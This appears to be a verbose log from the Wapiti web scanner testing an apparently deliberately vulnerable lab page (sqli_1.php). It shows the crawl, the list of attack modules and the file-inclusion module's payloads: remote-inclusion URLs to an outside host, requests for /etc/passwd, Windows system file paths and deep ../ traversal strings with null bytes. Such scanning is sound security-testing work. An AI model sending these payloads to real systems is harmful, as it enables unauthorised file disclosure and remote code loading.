2024-03-20 16:41:19.405 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
2024-03-20 16:41:19.522 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
2024-03-20 16:41:19.523 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:41:19.523 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13
2024-03-20 16:41:19.524 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php (1)
2024-03-20 16:41:19.688 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-20 16:41:19.688 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_10617f40.db
2024-03-20 16:41:19.691 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 5 URLs and forms during the scan
2024-03-20 16:41:19.722 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-20 16:41:19.722 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-20 16:41:19.807 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-20 16:41:19.836 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-20 16:41:19.837 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 16:41:19.853 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
2024-03-20 16:41:19.856 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=search (0)
2024-03-20 16:41:19.871 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&action=search (0)
2024-03-20 16:41:19.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:41:19.900 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:41:19.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fservices&action=search (0)
2024-03-20 16:41:19.922 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:41:19.934 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=search (0)
2024-03-20 16:41:19.949 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&action=search (0)
2024-03-20 16:41:19.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&action=search (0)
2024-03-20 16:41:19.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:41:19.990 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:41:20.005 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&action=search (0)
2024-03-20 16:41:20.017 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&action=search (0)
2024-03-20 16:41:20.033 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&action=search (0)
2024-03-20 16:41:20.044 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:41:20.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:41:20.067 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:41:20.078 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:41:20.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:41:20.101 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:41:20.112 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:41:20.130 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:41:20.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
